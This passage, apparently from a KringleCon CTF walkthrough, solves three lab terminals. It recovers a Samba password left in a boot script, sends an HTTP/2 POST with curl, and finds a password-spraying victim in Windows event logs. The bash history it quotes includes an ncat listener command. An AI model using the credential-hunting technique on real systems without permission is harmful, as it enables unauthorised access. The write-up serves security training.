<p>Hi, I'm Wunorse Openslae
What was that password?
Golly, passwords may be the end of all of us. Good guys can't remember them, and bad guess can guess them!
I've got to upload my chore report to my manager's inbox, but I can't remember my password.
Still, with all the automated tasks we use, I'll bet there's a way to find it in memory...</p>
</blockquote>
<pre><code>l,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
kxc,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
kkkxc,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
kkkkkxl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
kkkkkkkkl;,,c,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,o:,,,,,,,,,,,
kkkkkkkkkkok0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0K;,,,,,,,,,,
kkkkkkkkkkOXXd,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dXXl,,,,,,,,,,
kkkkkkkkkkOXXXk:,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,;,,,,,dXXXc,,,,,,,,,,
kkkkkkkkkkk0XXXXk:,,k:,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,:K:,,l0XXXO,,,,,,,,,,,
kkkkkkkkkkkk0XXXXXOkXx,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,xX0xKXXXXk,,,,,,,,,,,,
kkkkkkkkkkkkkOKXXXXXXXkxddo;,,,,,,,,,,,,,,,,,,,,,,,,cddxkXXXXXXXkc,,,,,,,,,,,,,
kkkkkkkkkkkkkkkk00KXXXXXkl,,,,,,,,,,,,oKOc,,,,,,,,,,,:xXXXX0kdc;,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkKXXXKx:,,,,,,,,;dKXXXX0l,,,,,,,,cxXXXXk,,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkk0XXXXX0xoc;,;dKXXXXXXXX0l;:cokKXXXXKo,,,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkkk0KXXXXXXXXXXXXXXXXXXXXXXXXXXXXKkl,,,,,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkkkkkkOO00XXXXXXXXXXXXXXXXXXXxc:;,,,,,,,,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkkkkkkkO0XNWWNNXXXXXXXXXXNNWWN0o,,,,,,,,,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkkkkkO0XWMMMMMMNXXXXXXXNWMMMMMMNKo,,,,,,,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkkkk0XXWMMMMMMMMNXXXXXXWMMMMMMMMNX0c,,,,,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkkOKXXNMMMMMMMMMWXXXXXNMMMMMMMMMWXXXx,,,,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkOXXXXNMMMMMMMMMMXXXXXNMMMMMMMMMWXXXXk,,,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkKXXXXNMMMMXl:dWWXXXXXNMXl:dWMMMWXXXXXd,,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkk0XXXXXXNMMMo   KNXXXXXXNo   KMMMNXXXXXX;,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkKXXXXXXXNWMM0kKNXXXXXXXXN0kXMMWNXXXXXXXo,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkXXXXXXXXXXNNNNXXXX0xxKXXXXNNNNXXXXXXXXXx,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkXXXXXXXXXXXXXXXXX'    oXXXXXXXXXXXXXXXXd,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkk0XXXXXXXXXXXXXXXX.    cXXXXXXXXXXXXXXXXc,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkOXXXXXXXXXXXXXXXXXdllkXXXXXXXXXXXXXXXXk,,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkk0XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXkl,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkk0XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXOkkkl;,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkkkOXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXKkkkkkkko;,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkkkkk0XXXXXXXXXXXXXXXXXXXXXXXXXXXKOkkkkkkkkkkd:,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkkkkkkkOKXXXXXXXXXXXXXXXXXXXXXXKOkkkkkkkkkkkkkkd:,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkO0KXXXXXXXXXXXXXXK0Okkkkkkkkkkkkkkkkkkkd:,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOO000000OOkkkkkkkkkkkkkkkkkkkkkkkkkkxc,,,,,,
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkxl,,,,
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkxl,,
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx;

Thank you Madam or Sir for the help that you bring!
I was wondering how I might rescue my day.
Finished mucking out stalls of those pulling the sleigh,
My report is now due or my KRINGLE's in a sling!

There's a samba share here on this terminal screen.
What I normally do is to upload the file,
With our network credentials (we've shared for a while).
When I try to remember, my memory's clean!

Be it last night's nog bender or just lack of rest,
For the life of me I can't send in my report.
Could there be buried hints or some way to contort,
Gaining access - oh please now do give it your best!

-Wunorse Openslae


Complete this challenge by uploading the elf's report.txt
file to the samba share at //localhost/report-upload/

</code></pre>

<p>Based on Wunorse's conversation and the logon message for the terminal, our goal is to upload the <code>report.txt</code> file located in elf's home directory to the <code>//localhost/report-upload/</code> samba share. However, attempting to do this using elf results in an <code>NT_STATUS_ACCESS_DENIED</code> error.</p>
<pre><code>
elf@279c1663354c:~$ smbclient //localhost/report-upload
WARNING: The &quot;syslog&quot; option is deprecated
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.5.12-Debian]
tree connect failed: NT_STATUS_ACCESS_DENIED

</code></pre>

<p>Based upon the hint from Wunorse, we attempt to look through files that handle task automation for this machine. Eventually we find luck with <code>/sbin/init</code>, which contains commands for the system to run upon boot.</p>
<pre><code>
#!/bin/bash
echo &quot;$(date)&quot; &gt;&gt; /home/elf/report.txt
(nohup sudo -u manager /home/manager/samba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do-not-run-as-tyler --accept-sage-advice -a 42 -d'~' --ignore-sw-holiday-special --suppress --suppress //localhost/report-upload/ directreindeerflatterystable -U report-upload 2&gt;/dev/null &amp;)
sudo -E -u manager /usr/bin/python /home/manager/report-check.py 2&gt;/dev/null &amp;
(nohup /usr/sbin/smbd &gt;/dev/null 2&gt;/dev/null &amp; disown)
echo 127.0.0.1   `cat /etc/hostname` &gt;&gt; /etc/hosts
sudo -u elf /bin/bash
</code></pre>

<p>In this file, we find a string that appears to be used as a samba password, <code>directreindeerflatterystable</code>.
With this information, we can now attempt to upload the report to the samba share:</p>
<pre><code>elf@279c1663354c:~$ smbclient -U report-upload //localhost/report-upload directreindeerflatterystable
WARNING: The &quot;syslog&quot; option is deprecated
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.5.12-Debian]
smb: \&gt; put report.txt
putting file report.txt as \report.txt (250.5 kb/s) (average 250.5 kb/s)
smb: \&gt; Terminated
elf@279c1663354c:~$

                               .;;;;;;;;;;;;;;;'                               
                             ,NWOkkkkkkkkkkkkkkNN;                             
                           ..KM; Stall Mucking ,MN..                           
                         OMNXNMd.             .oMWXXM0.                        
                        ;MO   l0NNNNNNNNNNNNNNN0o   xMc                        
                        :MO                         xMl             '.         
                        :MO   dOOOOOOOOOOOOOOOOOd.  xMl             :l:.       
 .cc::::::::;;;;;;;;;;;,oMO  .0NNNNNNNNNNNNNNNNN0.  xMd,,,,,,,,,,,,,clll:.     
 'kkkkxxxxxddddddoooooooxMO   ..'''''''''''.        xMkcccccccllllllllllooc.   
 'kkkkxxxxxddddddoooooooxMO  .MMMMMMMMMMMMMM,       xMkcccccccllllllllllooool  
 'kkkkxxxxxddddddoooooooxMO   '::::::::::::,        xMkcccccccllllllllllool,   
 .ooooollllllccccccccc::dMO                         xMx;;;;;::::::::lllll'     
                        :MO  .ONNNNNNNNXk           xMl             :lc'       
                        :MO   dOOOOOOOOOo           xMl             ;.         
                        :MO   'cccccccccccccc:'     xMl                        
                        :MO  .WMMMMMMMMMMMMMMMW.    xMl                        
                        :MO    ...............      xMl                        
                        .NWxddddddddddddddddddddddddNW'                        
                          ;ccccccccccccccccccccccccc;                          



You have found the credentials I just had forgot,
And in doing so you've saved me trouble untold.
Going forward we'll leave behind policies old,
Building separate accounts for each elf in the lot.

-Wunorse Openslae
</code></pre>

<blockquote>
<p>Thank goodness for command line passwords - and thanks for your help!
Speaking of good ways to find credentials, have you heard of Trufflehog?
It's a cool way to dig through repositories for passwords, RSA keys, and more.
I mean, no one EVER uploads sensitive credentials to public repositories, right? But if they did, this would be a great tool for finding them.
But hey, listen to me ramble. If you're interested in Trufflehog, you should check out Brian Hostetler's talk!
Have you tried the entropy=True option when running Trufflehog? It is amazing how much deeper it will dig!</p>
<p>- Wunorese Openslae</p>
</blockquote>
<h3 id="5-curling-master-holly-evergreen">5) CURLing Master (Holly Evergreen)<a class="headerlink" href="#5-curling-master-holly-evergreen" title="Permanent link">&para;</a></h3>
<p>This terminal can be found in the left hallway of the first floor.</p>
<p><img alt="Location" src="5-location.png" /></p>
<blockquote>
<p>Hi, I'm Holly Everygreen.
Oh that Bushy!
Sorry to vent, but that brother of mine did something strange.
The trigger to restart the Candy Striper is apparently an arcane HTTP call or 2.
I sometimes wonder if all IT folk do strange things with their home networks...</p>
</blockquote>
<pre><code>                  .....................................                        
                 ...',,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,'....                      
                 ...,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,'...                     
                  ......'''''''''''''''''''''''',,,,,,,'...                    
                     ............................',,,,,,,...                   
                                                ...,,,,,,'...                  
                                                 ..',,,,,,'..                  
                                                 ...,,,,,,,...                 
                                                 ...,,,,,,,...                 
            ........................................,,,,,,,'......             
         .....''''''''''''''''''''''''''''''''''''',,,,,,,,,,'''.....          
        ...............................................................        
        ...............................................................        
      .:llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc.       
     .llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll;      
    'llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll:     
   .kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk:    
   o0000000000000000000000000000000000000000000000000000000000000000000000O    
   O00000000000000000000000000000000000000000000000000000000000000000000000'   
   O00000000000000000000000000000000000000000000000000000000000000000000000'   
   d0000000000000000000000000000000000000000000000000000000000000000000000O.   
   'OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOc    
    ,llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll:     
     ,llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll:      
      .clllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll'       
        'clllllllllllllllllllllllllllllllllllllllllllllllllllllllllll,         
          .,clllllllllllllllllllllllllllllllllllllllllllllllllllll;.           
              .';:cllllllllllllllllllllllllllllllllllllllllcc;,..              




I am Holly Evergreen, and now you won't believe:
Once again the striper stopped; I think I might just leave!
Bushy set it up to start upon a website call.
Darned if I can CURL it on - my Linux skills apall.

Could you be our CURLing master - fixing up this mess?
If you are, there's one concern you surely must address.
Something's off about the conf that Bushy put in place.
Can you overcome this snag and save us all some face?

  Complete this challenge by submitting the right HTTP 
  request to the server at http://localhost:8080/ to 
  get the candy striper started again. You may view 
  the contents of the nginx.conf file in 
  /etc/nginx/, if helpful.
</code></pre>

<p>Based on the instructions from Holly and the login message, our goal is to submit the correct HTTP request to the webserver located on <code>localhost:8080</code>. However, sending a regular GET request to <code>localhost:8080</code> gives us a response made up of non-printable, binary data.</p>
<p>After examining our home directory, we see a <code>.bash_history</code> file with data, readable by us. Upon examining elf's bash history, we find a very interesting curl command that implies the webserver on 8080 actually handles HTTP2 requests.</p>
<pre><code>elf@53ab4f44ffa5:~$ ls -lah
total 24K
drwxr-xr-x 1 elf  elf  4.0K Dec 14 16:15 .
drwxr-xr-x 1 root root 4.0K Dec 14 16:14 ..
-rw-r--r-- 1 elf  elf   464 Dec 14 16:13 .bash_history
-rw-r--r-- 1 elf  elf   220 May 15  2017 .bash_logout
-rw-r--r-- 1 elf  elf  3.5K Dec 14 16:15 .bashrc
-rw-r--r-- 1 elf  elf   675 May 15  2017 .profile
elf@53ab4f44ffa5:~$ cat .bash_history
netstat -ant
ncat --broker -nlvp 9090
echo &quot;\302\257\_(\343\203\204)_/\302\257&quot; &gt;&gt; /tmp/shruggins
cat /tmp/shruggins
curl --http2-prior-knowledge http://localhost:8080/index.php
telnet towel.blinkenlights.nl
[...snip...]
</code></pre>

<p>After attempting that command without any modification, we recieve a response instructing us to send a POST request with a parameter of <code>status=on</code>. </p>
<pre><code>elf@53ab4f44ffa5:~$ curl --http2-prior-knowledge http://localhost:8080/index.php
&lt;html&gt;
 &lt;head&gt;
  &lt;title&gt;Candy Striper Turner-On'er&lt;/title&gt;
 &lt;/head&gt;
 &lt;body&gt;
 &lt;p&gt;To turn the machine on, simply POST to this URL with parameter &quot;status=on&quot;

 &lt;/body&gt;
&lt;/html&gt;
</code></pre>

<p>To do this, we simply add the flag <code>--data "status=on"</code> to our curl command. By having the <code>--data flag</code>, <code>curl</code> will handle it as a POST request. We successfully send our request and complete this exercise.</p>
<pre><code>elf@53ab4f44ffa5:~$ curl --http2-prior-knowledge --data &quot;status=on&quot; http://localhost:8080/index.ph
p
&lt;html&gt;
 &lt;head&gt;
  &lt;title&gt;Candy Striper Turner-On'er&lt;/title&gt;
 &lt;/head&gt;
 &lt;body&gt;
 &lt;p&gt;To turn the machine on, simply POST to this URL with parameter &quot;status=on&quot;

                                                                okkd,          
                                                               OXXXXX,         
                                                              oXXXXXXo         
                                                             ;XXXXXXX;         
                                                            ;KXXXXXXx          
                                                           oXXXXXXXO           
                                                        .lKXXXXXXX0.           
  ''''''       .''''''       .''''''       .:::;   ':okKXXXXXXXX0Oxcooddool,   
 'MMMMMO',,,,,;WMMMMM0',,,,,;WMMMMMK',,,,,,occccoOXXXXXXXXXXXXXxxXXXXXXXXXXX.  
 'MMMMN;,,,,,'0MMMMMW;,,,,,'OMMMMMW:,,,,,'kxcccc0XXXXXXXXXXXXXXxx0KKKKK000d;   
 'MMMMl,,,,,,oMMMMMMo,,,,,,lMMMMMMd,,,,,,cMxcccc0XXXXXXXXXXXXXXOdkO000KKKKK0x. 
 'MMMO',,,,,;WMMMMMO',,,,,,NMMMMMK',,,,,,XMxcccc0XXXXXXXXXXXXXXxxXXXXXXXXXXXX: 
 'MMN,,,,,,'OMMMMMW;,,,,,'kMMMMMW;,,,,,'xMMxcccc0XXXXXXXXXXXXKkkxxO00000OOx;.  
 'MMl,,,,,,lMMMMMMo,,,,,,cMMMMMMd,,,,,,:MMMxcccc0XXXXXXXXXXKOOkd0XXXXXXXXXXO.  
 'M0',,,,,;WMMMMM0',,,,,,NMMMMMK,,,,,,,XMMMxcccckXXXXXXXXXX0KXKxOKKKXXXXXXXk.  
 .c.......'cccccc.......'cccccc.......'cccc:ccc: .c0XXXXXXXXXX0xO0000000Oc     
                                                    ;xKXXXXXXX0xKXXXXXXXXK.    
                                                       ..,:ccllc:cccccc:'      

Unencrypted 2.0? He's such a silly guy.
That's the kind of stunt that makes my OWASP friends all cry.
Truth be told: most major sites are speaking 2.0;
TLS connections are in place when they do so.

-Holly Evergreen
&lt;p&gt;Congratulations! You've won and have successfully completed this challenge.
&lt;p&gt;POSTing data in HTTP/2.0.

 &lt;/body&gt;
&lt;/html&gt;
</code></pre>

<blockquote>
<p>Unencrypted HTTP/2? What was he thinking? Oh well.
Have you ever used Bloodhound for testing Active Directory implementations?
It's a merry little tool that can sniff AD and find paths to reaching privileged status on specific machines.
AD implementations can get so complicated that administrators may not even know what paths they've set up that attackers might exploit.
Have you seen anyone demo the tool before?</p>
<p>- Holly Evergreen</p>
</blockquote>
<h3 id="6-yule-log-analysis-pepper-minstix">6) Yule Log Analysis (Pepper Minstix)<a class="headerlink" href="#6-yule-log-analysis-pepper-minstix" title="Permanent link">&para;</a></h3>
<p>This exercise is found very far into the second floor's right hallway, past the speaker unpreparedness room.</p>
<p><img alt="Location" src="6-location.png" /></p>
<blockquote>
<p>Hi, I'm Pepper Minstix.
Have you heard of password spraying? It seems we've been victim.
We fear that they were successful in accessing one of our Elf Web Access accounts, but we don't know which one.
Parsing through .evtx files can be tricky, but there's a Python script that can help you convert it into XML for easier grep'ing.</p>
</blockquote>
<pre><code>
                             .;:cccckkxdc;.                                     
                         .o0xc;,,,,,XMMMMMkc:,.                                 
                       lXMMMX;,,,,,,XMMMMK,,coddcclOkxoc,.                      
                     lk:oNMMMX;,,,,,XMMWN00o:,,,,,:MMMMMMoc;'                   
                   .0l,,,,dNMMX;,,,,XNNWMMMk,,,,,,:MMMMMx,,,,:;.                
                  .K;,,,,,,,xWMX;,,;Kx:kWMMMk,,,,,:MMMM0,,,,,,,:k'              
                 .XklooooddolckWN:l0:,,,;kWMMO,,,,:MMMN;,,,,,cOWMMd             
               ;oooc;,,,cMMMMMMxkO0,,,,,,,:OMM0,,,:MMWc,,,,lKMMMMWKo            
            ;OMMWl,,,,,,cMMMMMO,,,:cc,,,,,,,:0M0,,:MMd,,,oXMMWKxc,,,c           
          cOdXMMMWl,,,,,cMMMMX,,,,,,,:xxo:,,,,cK0,:MO,;xNWKxc,,,,,,,:.          
        .0l,,,oNMMWl,,,,cMMMW:,,,,,,dXMWNMWXOdc;lxcX:xOxc,,,,,,,,,,,,:          
       ,0;,,,,,,dNMWo,,,cMMMl,,,,;xNMMMMW0kkkkkkddxdddxxxxxxxxxxxxxxxo          
      .Wl,,,,,,,,,dWMo,,cMMx,,,:OWMMW0xc,:c,,:dOkcK:kc:ok0NMMMMMMMMMMd          
      KMMWXOdl;,,,,;xWd,cM0,,l0MW0dc,,,,,,lkWWk:,OW,:XO:,,,;ldOXWMMMM'          
     'MMMMMMMMMN0ko:,;kdcN;o00dc,,,,,,,,,,,0x;,,oMW,,;XWk;,,,,,,,:okk           
     cNKKKKKKKKKKKKKKkoodxxdccccccccccccccco,,,:WMW,,,;XMWk;,,,,,,,l            
     :x,,,,,,,,,,,,,cdkoOldldOKWMMMMMMMMMMMx,,,XMMW,,,,;XMMWx,,,,;c             
     .K,,,,,,,,,cd0WKl,xN,oXo,,,:ok0NMMMMMMc,,OMMMW,,,,,;KMMMNd;l'              
      dl,,,,cx0WMM0c,,lMN,,oMXl,,,,,,;ldOX0',dMMMMW,,,,,,;KMMMK;                
       OoxKWMMMWk:,,,;NMN,,,lWMKc,,,,,,,,ldclWMMMMW,,,,,,:oOl.                  
        OMMMMNx;,,,,,KMMN,,,,lWMM0c,,,,,l. .,cdkO00ccc:;,.                      
         cWXo,,,,,,,kMMMN,,,,,cWMMM0:,c:                                        
          .Kc,,,,,,:MMMMN,,,,,,dMMMMWk'                                         


I am Pepper Minstix, and I'm looking for your help.
Bad guys have us tangled up in pepperminty kelp!
&quot;Password spraying&quot; is to blame for this our grinchly fate.
Should we blame our password policies which users hate?

Here you'll find a web log filled with failure and success.
One successful login there requires your redress.
Can you help us figure out which user was attacked?
Tell us who fell victim, and please handle this with tact...

  Submit the compromised webmail username to 
  runtoanswer to complete this challenge.
</code></pre>

<p>We first test out the <code>evtx_dump.py</code> script to see what input it accepts and what format it outputs the logs in. After examining the output, we notice the line, <code>&lt;EventID Qualifiers=""&gt;4647&lt;/EventID&gt;</code>, which identifies what EventID this log entry falls under. All Windows Security Log Events have a numeric EventID associated with it that describes what type of event it is. To complete this exercise, we should be able to match that field to filter for specific event types.</p>
<pre><code>elf@b6eaa89be3f0:~$ ls -lah
total 6.8M
drwxr-xr-x 1 elf  elf  4.0K Dec 14 16:42 .
drwxr-xr-x 1 root root 4.0K Dec 14 16:42 ..
-rw-r--r-- 1 elf  elf   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 elf  elf  3.7K Dec 14 16:42 .bashrc
-rw-r--r-- 1 elf  elf   807 Apr  4  2018 .profile
-rw-r--r-- 1 elf  elf  1.4K Dec 14 16:13 evtx_dump.py
-rw-r--r-- 1 elf  elf  1.1M Dec 14 16:13 ho-ho-no.evtx
-rwxr-xr-x 1 elf  elf  5.7M Dec 14 16:13 runtoanswer
elf@b6eaa89be3f0:~$ python evtx_dump.py -h
usage: evtx_dump.py [-h] evtx

Dump a binary EVTX file into XML.

positional arguments:
  evtx        Path to the Windows EVTX event log file

optional arguments:
  -h, --help  show this help message and exit
elf@b6eaa89be3f0:~$ python evtx_dump.py ho-ho-no.evtx | wc -l
50895
elf@b6eaa89be3f0:~$ python evtx_dump.py ho-ho-no.evtx 2&gt;/dev/null | head -n 25
&lt;?xml version=&quot;1.1&quot; encoding=&quot;utf-8&quot; standalone=&quot;yes&quot; ?&gt;

&lt;Events&gt;
&lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
&lt;System&gt;&lt;Provider Name=&quot;Microsoft-Windows-Security-Auditing&quot; Guid=&quot;{54849625-5478-4994-a5ba-3e3b0328c30d}&quot;&gt;&lt;/Provider&gt;
&lt;EventID Qualifiers=&quot;&quot;&gt;4647&lt;/EventID&gt;
&lt;Version&gt;0&lt;/Version&gt;
&lt;Level&gt;0&lt;/Level&gt;
&lt;Task&gt;12545&lt;/Task&gt;
&lt;Opcode&gt;0&lt;/Opcode&gt;
&lt;Keywords&gt;0x8020000000000000&lt;/Keywords&gt;
&lt;TimeCreated SystemTime=&quot;2018-09-10 12:18:26.972103&quot;&gt;&lt;/TimeCreated&gt;
&lt;EventRecordID&gt;231712&lt;/EventRecordID&gt;
&lt;Correlation ActivityID=&quot;{fd18dc13-48f8-0001-58dc-18fdf848d401}&quot; RelatedActivityID=&quot;&quot;&gt;&lt;/Correlation&gt;
&lt;Execution ProcessID=&quot;660&quot; ThreadID=&quot;752&quot;&gt;&lt;/Execution&gt;
&lt;Channel&gt;Security&lt;/Channel&gt;
&lt;Computer&gt;WIN-KCON-EXCH16.EM.KRINGLECON.COM&lt;/Computer&gt;
&lt;Security UserID=&quot;&quot;&gt;&lt;/Security&gt;
&lt;/System&gt;
&lt;EventData&gt;&lt;Data Name=&quot;TargetUserSid&quot;&gt; S-1-5-21-25059752-1411454016-2901770228-500 &lt;/Data&gt;
&lt;Data Name=&quot;TargetUserName&quot;&gt;Administrator&lt;/Data&gt;
&lt;Data Name=&quot;TargetDomainName&quot;&gt;EM.KRINGLECON&lt;/Data&gt;
&lt;Data Name=&quot;TargetLogonId&quot;&gt;0x0000000000969b09&lt;/Data&gt;
&lt;/EventData&gt;
&lt;/Event&gt;
</code></pre>

<p>To discover what webmail username has been comprimised by the password spraying attack, we are most interested in these two Event IDs:</p>
<ul>
<li>EventID 4624 - An account was successfully logged on</li>
<li>EventID 4625 - An account failed to log on</li>
</ul>
<p>In order to determine the best way to format our data for analysis, we first look at a few logon events to determine what line will give us the desired username. </p>
<p>Our full command for this step involves several steps:
The <code>evtx_dump.py</code> output while hiding all errors using <code>2&gt;/dev/null</code>. This output is then piped to a grep command that searches for the lines that include the <code>EventID 4624</code>, as well as a few lines before and after to make sure we grab the entire log entry. Finally, we pipe that output to the <code>head</code> command, just to limit our total output for analysis purposes and only view the first matched entry.</p>
<pre><code>elf@396cf1de836c:~$ python evtx_dump.py ho-ho-no.evtx 2&gt;/dev/null | grep -B 5 -A 25 '&lt;EventID Qualifiers=&quot;&quot;&gt;4624&lt;/EventID&gt;' | head -n 30
&lt;EventData&gt;&lt;/EventData&gt;
&lt;/Event&gt;

&lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
&lt;System&gt;&lt;Provider Name=&quot;Microsoft-Windows-Security-Auditing&quot; Guid=&quot;{54849625-5478-4994-a5ba-3e3b0328c30d}&quot;&gt;&lt;/Provider&gt;
&lt;EventID Qualifiers=&quot;&quot;&gt;4624&lt;/EventID&gt;
&lt;Version&gt;2&lt;/Version&gt;
&lt;Level&gt;0&lt;/Level&gt;
&lt;Task&gt;12544&lt;/Task&gt;
&lt;Opcode&gt;0&lt;/Opcode&gt;
&lt;Keywords&gt;0x8020000000000000&lt;/Keywords&gt;
&lt;TimeCreated SystemTime=&quot;2018-09-10 12:19:20.695601&quot;&gt;&lt;/TimeCreated&gt;
&lt;EventRecordID&gt;231726&lt;/EventRecordID&gt;
&lt;Correlation ActivityID=&quot;&quot; RelatedActivityID=&quot;&quot;&gt;&lt;/Correlation&gt;
&lt;Execution ProcessID=&quot;664&quot; ThreadID=&quot;668&quot;&gt;&lt;/Execution&gt;
&lt;Channel&gt;Security&lt;/Channel&gt;
&lt;Computer&gt;WIN-KCON-EXCH16.EM.KRINGLECON.COM&lt;/Computer&gt;
&lt;Security UserID=&quot;&quot;&gt;&lt;/Security&gt;
&lt;/System&gt;
&lt;EventData&gt;&lt;Data Name=&quot;SubjectUserSid&quot;&gt;S-1-0-0&lt;/Data&gt;
&lt;Data Name=&quot;SubjectUserName&quot;&gt;-&lt;/Data&gt;
&lt;Data Name=&quot;SubjectDomainName&quot;&gt;-&lt;/Data&gt;
&lt;Data Name=&quot;SubjectLogonId&quot;&gt;0x0000000000000000&lt;/Data&gt;
&lt;Data Name=&quot;TargetUserSid&quot;&gt;S-1-5-18&lt;/Data&gt;
&lt;Data Name=&quot;TargetUserName&quot;&gt;SYSTEM&lt;/Data&gt;
&lt;Data Name=&quot;TargetDomainName&quot;&gt;NT AUTHORITY&lt;/Data&gt;
&lt;Data Name=&quot;TargetLogonId&quot;&gt;0x00000000000003e7&lt;/Data&gt;
&lt;Data Name=&quot;LogonType&quot;&gt;0&lt;/Data&gt;
&lt;Data Name=&quot;LogonProcessName&quot;&gt;-&lt;/Data&gt;
&lt;Data Name=&quot;AuthenticationPackageName&quot;&gt;-&lt;/Data&gt;
</code></pre>

<p>Based on this entry, we determine that <code>TargetUserName</code> is the value we must filter for. This line is the same for both event types. Now, we grab a list of users who successfully logged on, as well as users who have a failed login attempt. Our commands for this part involves several steps:</p>
<p>We first find all entries for our desired Event ID and then retrieve the usernames within them. We also remove all duplicate usernames. Afterwards, we filter out the system accounts, leaving us with all user accounts who have a log entry for that Event ID.</p>
<p>Additionally, the style of the usernames for failed and successful logons is slightly different. To manage this, we perform a final <code>grep</code> to format all usernames into a <code>firstname.lastname</code> style in order to allow us to compare the files against each other.</p>
<pre><code>elf@396cf1de836c:~$ python evtx_dump.py ho-ho-no.evtx 2&gt;/dev/null | grep -B 5 -A 25 '&lt;EventID Qualifiers=&quot;&quot;&gt;4625&lt;/EventID&gt;' | grep 'TargetUserName' | sort | uniq | grep -E -v '(Health|LOCAL|MSSQL|NETWORK|SYSTEM|DWM-1|ISUR|Admin|ANONYMOUS
|Backup|WIN-KCON-EXCH)' &gt; failedlogons.txt
elf@396cf1de836c:~$ python evtx_dump.py ho-ho-no.evtx 2&gt;/dev/null | grep -B 5 -A 25 '&lt;EventID Qualifiers=&quot;&quot;&gt;4624&lt;/EventID&gt;' | grep 'TargetUserName' | sort | uniq | grep -E -v '(Health|LOCAL|MSSQL|NETWORK|SYSTEM|DWM-1|ISUR|Admin|ANONYMOUS
|Backup|WIN-KCON-EXCH)' &gt; successfullogons.txt
elf@396cf1de836c:~$ cat failedlogons.txt | grep -Eo &quot;[a-z]+\.[a-z]+&quot; &gt; failed.txt
elf@396cf1de836c:~$ cat successfullogons.txt | grep -Eo &quot;[a-z]+\.[a-z]+&quot; &gt; successful.txt
</code></pre>

<p>Since a password spraying attack tests each account using only one password, the compromised account will be the username who has a successful logon, with no failed attempts. By comparing the two files using the <code>comm</code> program in order to find entries unique to <code>successful.txt</code>, we find that <strong><em>minty.candycane</em></strong> is who fits this criteria.</p>
<p>We then successfully verify our answer with the <code>runtoanswer</code> program and receive the victory message.</p>
<pre><code>elf@396cf1de836c:~$ comm -13 failed.txt successful.txt
minty.candycane
elf@396cf1de836c:~$ ./runtoanswer
Loading, please wait......



